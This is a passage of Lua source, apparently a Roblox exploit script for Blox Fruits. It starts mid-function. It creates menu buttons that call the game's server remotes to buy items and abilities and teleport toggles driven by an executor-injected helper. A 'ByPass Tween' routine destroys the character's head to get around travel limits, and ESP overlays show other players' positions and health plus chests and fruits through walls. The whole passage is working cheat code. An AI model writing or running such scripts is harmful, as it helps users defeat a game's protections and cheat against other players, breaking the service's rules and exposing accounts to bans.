    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
end)
Shop1:Button("Buy SuperHuman",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")
end)
Shop1:Button("Buy Death Step",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
end)
Shop1:Button("Buy Sharkman Karate",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate",true)
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
end)
Shop1:Button("Buy Electric Claw",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
end)
Shop1:Button("Buy Dragon Talon",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
end)
Shop1:Button("Buy God Human",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
end)
Shop1:Button("Buy Sanguine Art",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySanguineArt")
end)
Shop3:Button("Buy Geppo",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Geppo")
end)
Shop3:Button("Buy Buso Haki",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Buso")
end)
Shop3:Button("Buy Soru",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Soru")
end)
Shop3:Button("Buy Ken Haki",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk","Buy")
end)
Shop2:Button("Random Fruit",function()
    local args = {
        [1] = "Cousin",
        [2] = "Buy"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end)
Shop4:Button("Buy Cutlass",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cutlass")
end)
Shop4:Button("Buy Iron Mace",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Iron Mace")
end)
Shop4:Button("Buy Duel Katana",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Duel Katana")
end)
Shop4:Button("Buy Katana",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Katana")
end)
Shop4:Button("Buy Triple Katana",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Triple Katana")
end)
Shop4:Button("Buy Dual-Headed Blade",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual-Headed Blade")
end)
Shop4:Button("Buy Bisento",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Bisento")
end)
Shop4:Button("Buy Soul Cane",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Soul Cane")
end)
Shop5:Button("Buy Kabucha",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Slingshot","1")
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Slingshot","2")
end)
Shop5:Button("Buy Flintlock",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Flintlock")
end)
Shop5:Button("Buy Refined Flintlock",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Flintlock")
end)
Shop5:Button("Buy Musket",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Musket")
end)
Shop5:Button("Buy Slingshot",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Slingshot")
end)
Shop5:Button("Buy Cannon",function()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cannon")
end)
local Tp1 = Tab4:Section("- Teleport To World -","Left")
local Tp = Tab4:Section("- Teleport -","Left")
local Mys2 = Tab4:Section("- Mystic -","Left")
local Tp3 = Tab2:Section("- ESP All -","Left")
if game.PlaceId == 2753915549 then
    wait(.1)
    Island = {
        "WindMill",
        "Middle Town",
        "Jungle",
        "Pirate Village",
        "Desert",
        "Snow Island",
        "MarineFord",
        "Colosseum",
        "Sky Island 1",
        "Sky Island 2",
        "Prison",
        "Magma Village",
        "Under Water Island",
        "Fountain City"
        }
elseif game.PlaceId == 4442272183 then  
    wait(.1)
    Island = {
        "The Cafe",
        "Frist Spot",
        "Dark Area",
        "Flamingo Mansion",
        "Green Zone",
        "Colossuim",
        "Zombie Island",
        "Ice And Magma Island",
        "Ice Castle",
        "Forgotten Island",
        "Ussop Island",
        }
else
    wait(.1)
    Island = {
        "Mansion",
        "Hydra Island",
        "Castle On The Sea",
        "Port Town",
        "Great Tree",
        "Floating Turtle",
        "Haunted Castle",
        "Ice Cream Island",
        "Peanut Island",
        "Cake Island",
        "Sea Of Treats",
        "Candy Cane Island",
        "Tiki Outpost",
        }	
end
Tp:Dropdown("Select Island",Island,{"Select Island"},function(v)
    _G.Select_Island = v
end)
Tp:Toggle("Start Tween",false,function(value)
    _G.Start_Tween_Island = value    
    if _G.Start_Tween_Island == true then
        repeat wait()
            if _G.Select_Island == "WindMill" then
                getgenv().ToPos(CFrame.new(1110.11669921875, 115.3574447631836, 1426.2801513671875))
            elseif _G.Select_Island == "Middle Town" then
                getgenv().ToPos(CFrame.new(-780.8069458007812, 33.67769241333008, 1606.4222412109375))
            elseif _G.Select_Island == "Jungle" then
                getgenv().ToPos(CFrame.new(-1614.43310546875, 145.3488311767578, 144.54666137695312))
            elseif _G.Select_Island == "Pirate Village" then
                getgenv().ToPos(CFrame.new(-1250.5933837890625, 44.77783203125, 3820.25634765625))
            elseif _G.Select_Island == "Desert" then
                getgenv().ToPos(CFrame.new(960.5593872070312, 94.5592269897461, 4201.6435546875))
            elseif _G.Select_Island == "Snow Island" then
                getgenv().ToPos(CFrame.new(1179.448486328125, 154.553955078125, -1276.5528564453125))
            elseif _G.Select_Island == "MarineFord" then
                getgenv().ToPos(CFrame.new(-4795.46484375, 106.639892578125, 4344.22802734375))
            elseif _G.Select_Island == "Colosseum" then
                getgenv().ToPos(CFrame.new(-1438.7559814453125, 99.13253784179688, -2788.081787109375))
            elseif _G.Select_Island == "Sky Island 1" then
                getgenv().ToPos(CFrame.new(-4914.2744140625, 737.7118530273438, -2577.97412109375))
            elseif _G.Select_Island == "Sky Island 2" then
                getgenv().ToPos(CFrame.new(-4663.37646484375, 921.312255859375, -1775.239013671875))
            elseif _G.Select_Island == "Prison" then
                getgenv().ToPos( CFrame.new(4846.578125, 87.28545379638672, 734.9696044921875))
            elseif _G.Select_Island == "Magma Village" then
                getgenv().ToPos(CFrame.new(-5242.55615234375, 59.861671447753906, 8445.515625))
            elseif _G.Select_Island == "Under Water Island" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61173.4140625, 61.560420989990234, 1820.6488037109375))
            elseif _G.Select_Island == "Fountain City" then
                getgenv().ToPos(CFrame.new(5026.87548828125, 72.85872650146484, 4038.395263671875))
            elseif _G.Select_Island == "Shank Room" then
                getgenv().ToPos(CFrame.new(-1442.16553, 29.8788261, -28.3547478))
            elseif _G.Select_Island == "Mob Island" then
                getgenv().ToPos(CFrame.new(-2850.20068, 7.39224768, 5354.99268))
            elseif _G.Select_Island == "The Cafe" then
                getgenv().ToPos(CFrame.new(-385.25091552734375, 73.08590698242188, 280.3886413574219))
            elseif _G.Select_Island == "Frist Spot" then
                getgenv().ToPos(CFrame.new(-11.311455726623535, 67.51933288574219, 2771.5224609375))
            elseif _G.Select_Island == "Dark Area" then
                getgenv().ToPos(CFrame.new(3780.15234375, 113.120849609375, -3499.829345703125))
            elseif _G.Select_Island == "Flamingo Mansion" then
                getgenv().ToPos(CFrame.new(-388.4208068847656, 454.63671875, 641.76904296875))
            elseif _G.Select_Island == "Green Zone" then
                getgenv().ToPos( CFrame.new(-2277.50927734375, 170.26324462890625, -2738.119140625))
            elseif _G.Select_Island == "Colossuim" then
                getgenv().ToPos( CFrame.new(-1837.1778564453125, 176.788330078125, 1355.9031982421875))
            elseif _G.Select_Island == "Zombie Island" then
                getgenv().ToPos(CFrame.new(-5407.49658203125, 130.1032257080078, -714.726806640625))
            elseif _G.Select_Island == "Ice and lawa Island" then
                getgenv().ToPos(CFrame.new(-5850.67529296875, 113.928466796875, -5128.80859375))
            elseif _G.Select_Island == "Ice And Magma Island" then
                getgenv().ToPos(CFrame.new(-5687.322265625, 134.99508666992188, -5142.4560546875))
            elseif _G.Select_Island == "Cursed Ship" then
                getgenv().ToPos(CFrame.new(923.40197753906, 125.05712890625, 32885.875))
            elseif _G.Select_Island == "Ice Castle" then
                getgenv().ToPos(CFrame.new(5714.26611328125, 240.810791015625, -6495.71875))
            elseif _G.Select_Island == "Forgotten Island" then
                getgenv().ToPos(CFrame.new(-2809.4375, 110.94773864746094, -9532.626953125))
            elseif _G.Select_Island == "Ussop Island" then
                getgenv().ToPos(CFrame.new(4816.8618164063, 8.4599885940552, 2863.8195800781))
            elseif _G.Select_Island == "Mini Sky Island" then
                getgenv().ToPos(CFrame.new(-288.74060058594, 49326.31640625, -35248.59375))
            elseif _G.Select_Island == "Great Tree" then
                getgenv().ToPos(CFrame.new(2316.61962890625, 130.3724822998047, -6442.16650390625))
            elseif _G.Select_Island == "Castle On The Sea" then
                getgenv().ToPos(CFrame.new(-4987.142578125, 361.6728210449219, -3017.964111328125))
            elseif _G.Select_Island == "MiniSky" then
                getgenv().ToPos(CFrame.new(-260.65557861328, 49325.8046875, -35253.5703125))
            elseif _G.Select_Island == "Port Town" then
                getgenv().ToPos(CFrame.new(-286.2393493652344, 46.503822326660156, 5335.642578125))
            elseif _G.Select_Island == "Hydra Island" then
                getgenv().ToPos(CFrame.new(5230.0830078125, 766.97607421875, 346.3645324707031))
            elseif _G.Select_Island == "Floating Turtle" then
                getgenv().ToPos(CFrame.new(-12609.65625, 510.88226318359375, -8630.134765625))
            elseif _G.Select_Island == "Mansion" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-12465.3720703125, 374.94024658203125, -7452.3486328125))
            elseif _G.Select_Island == "Haunted Castle" then
                getgenv().ToPos(CFrame.new(-9515.3720703125, 274.4736633300781, 5786.06103515625))
            elseif _G.Select_Island == "Ice Cream Island" then
                getgenv().ToPos(CFrame.new(-846.4985961914062, 177.26763916015625, -10938.6875))
            elseif _G.Select_Island == "Peanut Island" then
                getgenv().ToPos(CFrame.new(-2044.5743408203125, 107.43963623046875, -9971.8896484375))
            elseif _G.Select_Island == "Cake Island" then
                getgenv().ToPos(CFrame.new(-1915.0732421875, 113.5052261352539, -11563.021484375))
            elseif _G.Select_Island == "Sea Of Treats" then
                getgenv().ToPos(CFrame.new(-54.24225997924805, 108.86431121826172, -11999.5390625))
            elseif _G.Select_Island == "Candy Cane Island" then
                getgenv().ToPos(CFrame.new(-1080.7022705078125, 14.957878112792969, -14483.0458984375))
            elseif _G.Select_Island == "Tiki Outpost" then
                getgenv().ToPos(CFrame.new(-16241.365234375, 9.403817176818848, 441.611083984375))
            end
        until not _G.Start_Tween_Island
    end
end)
function bytpisland(p)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
    game.Players.LocalPlayer.Character.Head:Destroy()
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
end
Tp:Button("ByPass Tween",function()
    if _G.Select_Island == "WindMill" then
        bytpisland(CFrame.new(1110.11669921875, 115.3574447631836, 1426.2801513671875))
    elseif _G.Select_Island == "Middle Town" then
        bytpisland(CFrame.new(-780.8069458007812, 33.67769241333008, 1606.4222412109375))
    elseif _G.Select_Island == "Jungle" then
        bytpisland(CFrame.new(-1614.43310546875, 145.3488311767578, 144.54666137695312))
    elseif _G.Select_Island == "Pirate Village" then
        bytpisland(CFrame.new(-1250.5933837890625, 44.77783203125, 3820.25634765625))
    elseif _G.Select_Island == "Desert" then
        bytpisland(CFrame.new(960.5593872070312, 94.5592269897461, 4201.6435546875))
    elseif _G.Select_Island == "Snow Island" then
        bytpisland(CFrame.new(1179.448486328125, 154.553955078125, -1276.5528564453125))
    elseif _G.Select_Island == "MarineFord" then
        bytpisland(CFrame.new(-4795.46484375, 106.639892578125, 4344.22802734375))
    elseif _G.Select_Island == "Colosseum" then
        bytpisland(CFrame.new(-1438.7559814453125, 99.13253784179688, -2788.081787109375))
    elseif _G.Select_Island == "Sky Island 1" then
        bytpisland(CFrame.new(-4914.2744140625, 737.7118530273438, -2577.97412109375))
    elseif _G.Select_Island == "Sky Island 2" then
        bytpisland(CFrame.new(-4663.37646484375, 921.312255859375, -1775.239013671875))
    elseif _G.Select_Island == "Prison" then
        bytpisland( CFrame.new(4846.578125, 87.28545379638672, 734.9696044921875))
    elseif _G.Select_Island == "Magma Village" then
        bytpisland(CFrame.new(-5242.55615234375, 59.861671447753906, 8445.515625))
    elseif _G.Select_Island == "Under Water Island" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61173.4140625, 61.560420989990234, 1820.6488037109375))
    elseif _G.Select_Island == "Fountain City" then
        bytpisland(CFrame.new(5026.87548828125, 72.85872650146484, 4038.395263671875))
    elseif _G.Select_Island == "Shank Room" then
        bytpisland(CFrame.new(-1442.16553, 29.8788261, -28.3547478))
    elseif _G.Select_Island == "Mob Island" then
        bytpisland(CFrame.new(-2850.20068, 7.39224768, 5354.99268))
    elseif _G.Select_Island == "The Cafe" then
        bytpisland(CFrame.new(-385.25091552734375, 73.08590698242188, 280.3886413574219))
    elseif _G.Select_Island == "Frist Spot" then
        bytpisland(CFrame.new(-11.311455726623535, 67.51933288574219, 2771.5224609375))
    elseif _G.Select_Island == "Dark Area" then
        bytpisland(CFrame.new(3780.15234375, 113.120849609375, -3499.829345703125))
    elseif _G.Select_Island == "Flamingo Mansion" then
        bytpisland(CFrame.new(-388.4208068847656, 454.63671875, 641.76904296875))
    elseif _G.Select_Island == "Green Zone" then
        bytpisland( CFrame.new(-2277.50927734375, 170.26324462890625, -2738.119140625))
    elseif _G.Select_Island == "Colossuim" then
        bytpisland( CFrame.new(-1837.1778564453125, 176.788330078125, 1355.9031982421875))
    elseif _G.Select_Island == "Zombie Island" then
        bytpisland(CFrame.new(-5407.49658203125, 130.1032257080078, -714.726806640625))
    elseif _G.Select_Island == "Ice and lawa Island" then
        bytpisland(CFrame.new(-5850.67529296875, 113.928466796875, -5128.80859375))
    elseif _G.Select_Island == "Ice And Magma Island" then
        bytpisland(CFrame.new(-5687.322265625, 134.99508666992188, -5142.4560546875))
    elseif _G.Select_Island == "Cursed Ship" then
        bytpisland(CFrame.new(923.40197753906, 125.05712890625, 32885.875))
    elseif _G.Select_Island == "Ice Castle" then
        bytpisland(CFrame.new(5714.26611328125, 240.810791015625, -6495.71875))
    elseif _G.Select_Island == "Forgotten Island" then
        bytpisland(CFrame.new(-2809.4375, 110.94773864746094, -9532.626953125))
    elseif _G.Select_Island == "Ussop Island" then
        bytpisland(CFrame.new(4816.8618164063, 8.4599885940552, 2863.8195800781))
    elseif _G.Select_Island == "Mini Sky Island" then
        bytpisland(CFrame.new(-288.74060058594, 49326.31640625, -35248.59375))
    elseif _G.Select_Island == "Great Tree" then
        bytpisland(CFrame.new(2316.61962890625, 130.3724822998047, -6442.16650390625))
    elseif _G.Select_Island == "Castle On The Sea" then
        bytpisland(CFrame.new(-4987.142578125, 361.6728210449219, -3017.964111328125))
    elseif _G.Select_Island == "MiniSky" then
        bytpisland(CFrame.new(-260.65557861328, 49325.8046875, -35253.5703125))
    elseif _G.Select_Island == "Port Town" then
        bytpisland(CFrame.new(-286.2393493652344, 46.503822326660156, 5335.642578125))
    elseif _G.Select_Island == "Hydra Island" then
        bytpisland(CFrame.new(5230.0830078125, 766.97607421875, 346.3645324707031))
    elseif _G.Select_Island == "Floating Turtle" then
        bytpisland(CFrame.new(-12609.65625, 510.88226318359375, -8630.134765625))
    elseif _G.Select_Island == "Mansion" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-12465.3720703125, 374.94024658203125, -7452.3486328125))
    elseif _G.Select_Island == "Haunted Castle" then
        bytpisland(CFrame.new(-9515.3720703125, 274.4736633300781, 5786.06103515625))
    elseif _G.Select_Island == "Ice Cream Island" then
        bytpisland(CFrame.new(-846.4985961914062, 177.26763916015625, -10938.6875))
    elseif _G.Select_Island == "Peanut Island" then
        bytpisland(CFrame.new(-2044.5743408203125, 107.43963623046875, -9971.8896484375))
    elseif _G.Select_Island == "Cake Island" then
        bytpisland(CFrame.new(-1915.0732421875, 113.5052261352539, -11563.021484375))
    elseif _G.Select_Island == "Sea Of Treats" then
        bytpisland(CFrame.new(-54.24225997924805, 108.86431121826172, -11999.5390625))
    elseif _G.Select_Island == "Candy Cane Island" then
        bytpisland(CFrame.new(-1080.7022705078125, 14.957878112792969, -14483.0458984375))
    elseif _G.Select_Island == "Tiki Outpost" then
        bytpisland(CFrame.new(-16241.365234375, 9.403817176818848, 441.611083984375))
    end
end)
MysList = {
    "Temple of Time",
    "Mink Door",
    "Cyborg Door",
    "Fish Door",
    "Human Door",
    "Ghoul Door",
    "Angle Door",
    "Ancient One"
}	
Mys2:Dropdown("Select Mystic Location",MysList,{"Select Mystic Location"},function(v)
    _G.MysChoose = v
end)
Mys2:Toggle("Start Tween",false,function(value)
_G.Start_Tween_Mys = value    
if _G.Start_Tween_Mys == true then
    repeat wait()
        if _G.MysChoose == "Temple of Time" then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28286.35546875, 14896.8505859375, 102.62469482421875)
        elseif _G.MysChoose == "Mink Door" then
            getgenv().ToPos(CFrame.new(29012.341796875, 14890.9755859375, -380.1492614746094))
        elseif _G.MysChoose == "Cyborg Door" then
            getgenv().ToPos(CFrame.new(28502.681640625, 14895.9755859375, -423.7279357910156))
        elseif _G.MysChoose == "Fish Door" then
            getgenv().ToPos(CFrame.new(28231.17578125, 14890.9755859375, -211.64173889160156))
        elseif _G.MysChoose == "Human Door" then
            getgenv().ToPos(CFrame.new(29221.822265625, 14890.9755859375, -205.99114990234375))
        elseif _G.MysChoose == "Ghoul Door" then
            getgenv().ToPos(CFrame.new(28674.244140625, 14890.6767578125, 445.4310607910156))
        elseif _G.MysChoose == "Angle Door" then
            getgenv().ToPos(CFrame.new(28960.158203125, 14919.6240234375, 235.03948974609375))
        elseif _G.MysChoose == "Ancient One" then
            getgenv().ToPos(CFrame.new(28975.416015625, 14889.9755859375, -119.18738555908203))
        end
    until not _G.Start_Tween_Mys
end
end)
Tp1:Button("First Sea",function()
    local args = {
        [1] = "TravelMain"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end)
Tp1:Button("Second Sea",function()
    local args = {
        [1] = "TravelDressrosa"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end)
Tp1:Button("Third Sea",function()
    local args = {
        [1] = "TravelZou"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end)

function isnil(thing)
    return (thing == nil)
end
local function round(n)
    return math.floor(tonumber(n) + 0.5)
end
Number = math.random(1, 1000000)
function UpdatePlayerChams()
    for i,v in pairs(game:GetService'Players':GetChildren()) do
        pcall(function()
            if not isnil(v.Character) then
                if ESPPlayer then
                    if not isnil(v.Character.Head) and not v.Character.Head:FindFirstChild('NameEsp'..Number) then
                        local bill = Instance.new('BillboardGui',v.Character.Head)
                        bill.Name = 'NameEsp'..Number
                        bill.ExtentsOffset = Vector3.new(0, 1, 0)
                        bill.Size = UDim2.new(1,200,1,30)
                        bill.Adornee = v.Character.Head
                        bill.AlwaysOnTop = true
                        local name = Instance.new('TextLabel',bill)
                        name.Font = Enum.Font.GothamSemibold
                        name.FontSize = "Size14"
                        name.TextWrapped = true
                        name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Character.Head.Position).Magnitude/3) ..' M')
                        name.Size = UDim2.new(1,0,1,0)
                        name.TextYAlignment = 'Top'
                        name.BackgroundTransparency = 1
                        name.TextStrokeTransparency = 0.5
                        if v.Team == game.Players.LocalPlayer.Team then
                            name.TextColor3 = Color3.new(0,255,0)
                        else
                            name.TextColor3 = Color3.new(255,0,0)
                        end
                    else
                        v.Character.Head['NameEsp'..Number].TextLabel.Text = (v.Name ..' | '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Character.Head.Position).Magnitude/3) ..' M\nHealth : ' .. round(v.Character.Humanoid.Health*100/v.Character.Humanoid.MaxHealth) .. '%')
                    end
                else
                    if v.Character.Head:FindFirstChild('NameEsp'..Number) then
                        v.Character.Head:FindFirstChild('NameEsp'..Number):Destroy()
                    end
                end
            end
        end)
    end
end
function UpdateChestChams() 
    for i,v in pairs(game.Workspace:GetChildren()) do
        pcall(function()
            if string.find(v.Name,"Chest") then
                if ChestESP then
                    if string.find(v.Name,"Chest") then
                        if not v:FindFirstChild('NameEsp'..Number) then
                            local bill = Instance.new('BillboardGui',v)
                            bill.Name = 'NameEsp'..Number
                            bill.ExtentsOffset = Vector3.new(0, 1, 0)
                            bill.Size = UDim2.new(1,200,1,30)
                            bill.Adornee = v
                            bill.AlwaysOnTop = true
                            local name = Instance.new('TextLabel',bill)
                            name.Font = Enum.Font.GothamSemibold
                            name.FontSize = "Size14"
                            name.TextWrapped = true
                            name.Size = UDim2.new(1,0,1,0)
                            name.TextYAlignment = 'Top'
                            name.BackgroundTransparency = 1
                            name.TextStrokeTransparency = 0.5
                            if v.Name == "Chest1" then
                                name.TextColor3 = Color3.fromRGB(109, 109, 109)
                                name.Text = ("Silver Chest" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Position).Magnitude/3) ..' M')
                            end
                            if v.Name == "Chest2" then
                                name.TextColor3 = Color3.fromRGB(173, 158, 21)
                                name.Text = ("Golden Chest" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Position).Magnitude/3) ..' M')
                            end
                            if v.Name == "Chest3" then
                                name.TextColor3 = Color3.fromRGB(85, 255, 255)
                                name.Text = ("Diamond Chest" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Position).Magnitude/3) ..' M')
                            end
                        else
                            v['NameEsp'..Number].TextLabel.Text = (v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Position).Magnitude/3) ..' M')
                        end
                    end
                else
                    if v:FindFirstChild('NameEsp'..Number) then
                        v:FindFirstChild('NameEsp'..Number):Destroy()
                    end
                end
            end
        end)
    end
end
function UpdateDevilChams() 
    for i,v in pairs(game.Workspace:GetChildren()) do
        pcall(function()
            if DevilFruitESP then
                if string.find(v.Name, "Fruit") then   
                    if not v.Handle:FindFirstChild('NameEsp'..Number) then
                        local bill = Instance.new('BillboardGui',v.Handle)
                        bill.Name = 'NameEsp'..Number
                        bill.ExtentsOffset = Vector3.new(0, 1, 0)
                        bill.Size = UDim2.new(1,200,1,30)
                        bill.Adornee = v.Handle
                        bill.AlwaysOnTop = true
                        local name = Instance.new('TextLabel',bill)
                        name.Font = Enum.Font.GothamSemibold
                        name.FontSize = "Size14"
                        name.TextWrapped = true
                        name.Size = UDim2.new(1,0,1,0)
                        name.TextYAlignment = 'Top'
                        name.BackgroundTransparency = 1
                        name.TextStrokeTransparency = 0.5
                        name.TextColor3 = UIThemeColorSave
                        name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
                    else
                        v.Handle['NameEsp'..Number].TextLabel.Text = (v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
                    end
                end
            else
                if v.Handle:FindFirstChild('NameEsp'..Number) then
                    v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end
        end)
    end
end
function UpdateFlowerChams() 
    for i,v in pairs(game.Workspace:GetChildren()) do
        pcall(function()
            if v.Name == "Flower2" or v.Name == "Flower1" then
                if FlowerESP then 
                    if not v:FindFirstChild('NameEsp'..Number) then
                        local bill = Instance.new('BillboardGui',v)
                        bill.Name = 'NameEsp'..Number
                        bill.ExtentsOffset = Vector3.new(0, 1, 0)
                        bill.Size = UDim2.new(1,200,1,30)
                        bill.Adornee = v
                        bill.AlwaysOnTop = true
                        local name = Instance.new('TextLabel',bill)
                        name.Font = Enum.Font.GothamSemibold
                        name.FontSize = "Size14"
                        name.TextWrapped = true
                        name.Size = UDim2.new(1,0,1,0)
                        name.TextYAlignment = 'Top'
                        name.BackgroundTransparency = 1
                        name.TextStrokeTransparency = 0.5
                        name.TextColor3 = Color3.fromRGB(82, 53, 254)
                        if v.Name == "Flower1" then 
                            name.Text = ("Blue Flower" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Position).Magnitude/3) ..' M')
                            name.TextColor3 = Color3.fromRGB(0, 0, 255)
                        end
                        if v.Name == "Flower2" then
                            name.Text = ("Red Flower" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Position).Magnitude/3) ..' M')
                            name.TextColor3 = Color3.fromRGB(82, 53, 254)
                        end
                    else
                        v['NameEsp'..Number].TextLabel.Text = (v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Position).Magnitude/3) ..' M')
                    end
                else
                    if v:FindFirstChild('NameEsp'..Number) then
                    v:FindFirstChild('NameEsp'..Number):Destroy()
                    end
                end
            end   
        end)
    end
end
function UpdateRealFruitChams() 
    for i,v in pairs(game.Workspace.AppleSpawner:GetChildren()) do
        if v:IsA("Tool") then
            if RealFruitESP then 
                if not v.Handle:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v.Handle)
                    bill.Name = 'NameEsp'..Number
                    bill.ExtentsOffset = Vector3.new(0, 1, 0)
                    bill.Size = UDim2.new(1,200,1,30)
                    bill.Adornee = v.Handle
                    bill.AlwaysOnTop = true
                    local name = Instance.new('TextLabel',bill)
                    name.Font = Enum.Font.GothamSemibold
                    name.FontSize = "Size14"
                    name.TextWrapped = true
                    name.Size = UDim2.new(1,0,1,0)
                    name.TextYAlignment = 'Top'
                    name.BackgroundTransparency = 1
                    name.TextStrokeTransparency = 0.5
                    name.TextColor3 = UIThemeColorSave
                    name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
                else
                    v.Handle['NameEsp'..Number].TextLabel.Text = (v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
                end
            else
                if v.Handle:FindFirstChild('NameEsp'..Number) then
                    v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end 
        end
    end
    for i,v in pairs(game.Workspace.PineappleSpawner:GetChildren()) do
        if v:IsA("Tool") then
            if RealFruitESP then 
                if not v.Handle:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v.Handle)
                    bill.Name = 'NameEsp'..Number
                    bill.ExtentsOffset = Vector3.new(0, 1, 0)
                    bill.Size = UDim2.new(1,200,1,30)
                    bill.Adornee = v.Handle
                    bill.AlwaysOnTop = true
                    local name = Instance.new('TextLabel',bill)
                    name.Font = Enum.Font.GothamSemibold
                    name.FontSize = "Size14"
                    name.TextWrapped = true
                    name.Size = UDim2.new(1,0,1,0)
                    name.TextYAlignment = 'Top'
                    name.BackgroundTransparency = 1
                    name.TextStrokeTransparency = 0.5
                    name.TextColor3 = Color3.fromRGB(255, 174, 0)
                    name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
                else
                    v.Handle['NameEsp'..Number].TextLabel.Text = (v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
                end
            else
                if v.Handle:FindFirstChild('NameEsp'..Number) then
                    v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end 
        end
    end
    for i,v in pairs(game.Workspace.BananaSpawner:GetChildren()) do
        if v:IsA("Tool") then
            if RealFruitESP then 
                if not v.Handle:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v.Handle)
                    bill.Name = 'NameEsp'..Number
                    bill.ExtentsOffset = Vector3.new(0, 1, 0)
                    bill.Size = UDim2.new(1,200,1,30)
                    bill.Adornee = v.Handle
                    bill.AlwaysOnTop = true
                    local name = Instance.new('TextLabel',bill)
                    name.Font = Enum.Font.GothamSemibold
                    name.FontSize = "Size14"
                    name.TextWrapped = true
                    name.Size = UDim2.new(1,0,1,0)
                    name.TextYAlignment = 'Top'
                    name.BackgroundTransparency = 1
                    name.TextStrokeTransparency = 0.5
                    name.TextColor3 = Color3.fromRGB(251, 255, 0)
                    name.Text = (v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
                else
                    v.Handle['NameEsp'..Number].TextLabel.Text = (v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Handle.Position).Magnitude/3) ..' M')
                end
            else
                if v.Handle:FindFirstChild('NameEsp'..Number) then
                    v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end 
        end
    end
end

